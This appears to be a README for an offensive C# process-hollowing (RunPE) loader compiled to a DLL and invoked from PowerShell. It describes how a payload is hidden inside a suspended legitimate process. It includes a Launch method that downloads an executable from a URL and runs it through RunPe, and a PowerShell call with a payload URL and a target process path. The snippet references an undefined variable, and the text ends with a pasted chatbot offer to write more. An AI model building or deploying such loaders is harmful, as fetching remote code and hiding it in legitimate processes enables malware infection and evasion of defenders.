## Introduction
Process hollowing is yet another tool in the kit of those who seek to hide the presence of a process. The idea is rather straight forward: a bootstrap application creates a seemingly innocent process in a suspended state. The legitimate image is then unmapped and replaced with the image that is to be hidden. If the preferred image base of the new image does not match that of the old image, the new image must be rebased. Once the new image is loaded in memory the EAX register of the suspended thread is set to the entry point. The process is then resumed and the entry point of the new image is executed.

## Overview
The Loader.cs is a C# implementation of a RunPE process hollowing technique. This technique is used to inject and execute a PE (Portable Executable) payload into a legitimate process's memory space, effectively hiding its presence.
The script.ps1 likely acts as the initiating script, which either:
Downloads the compiled Loader binary.
Executes the Loader with the required parameters (e.g., URLs or paths to payloads).

## Technical Details of Loader.cs as a DLL

Compilation to DLL:

The Loader.cs code will be compiled into a .NET DLL (Dynamic Link Library).
This allows external applications, including PowerShell, to interact with its public methods using reflection or direct invocation via the .NET framework.

Exposed Methods:

Loader.cs must expose its methods, such as Launch or RunPe, as public static so they can be called from PowerShell.
For example:

```csharp

public static void Launch(string appurl, string path)
        {
            if (!File.Exists(path))
            {
                return;
            }

            using (WebClient webClient = new WebClient())
            {
                byte[] Bytes = webClient.DownloadData(appurl);
                RunPe(Bytes, diretorio, "");
            }

        }
```
    

## Interaction via PowerShell:

The PowerShell script will use the [Reflection.Assembly]::LoadFrom() or Add-Type methods to load the DLL and call its methods.

PowerShell Script (script.ps1) Integration

Here’s an example of how the PowerShell script might load and interact with the DLL:

Invoking the Launch Method:

Use the fully qualified namespace and class name (Loader.c_Loader) to call methods:

    $appUrl = "http://example.com/payload.exe"
    $path = "C:\target\process.exe"

    # Call the static method
    [Loader.c_Loader]::Launch($appUrl, $path)

Passing Parameters:

Ensure parameters like appurl (URL to the payload) and path (target process) are correctly passed when invoking methods.


## Advantages of Using a DLL

    Modular Design: The PowerShell script focuses on orchestration, while the DLL encapsulates the complex logic.
    Reusability: The DLL can be reused across multiple scripts or applications.
    Dynamic Loading: PowerShell can load and use the DLL at runtime, making it flexible and adaptable to different scenarios.


## Example Flow

    1 Setup:
        Place the Loader.dll and the PowerShell script in the same directory or specify the path to the DLL in the script.
        
    2 Execute the Script:
        The PowerShell script loads the DLL, invokes the necessary methods, and triggers the execution of the payload.
        
    3 Payload Execution:
        The DLL performs process hollowing or other techniques as defined in Loader.cs.

Let me know if you'd like a sample PowerShell script template for this integration!

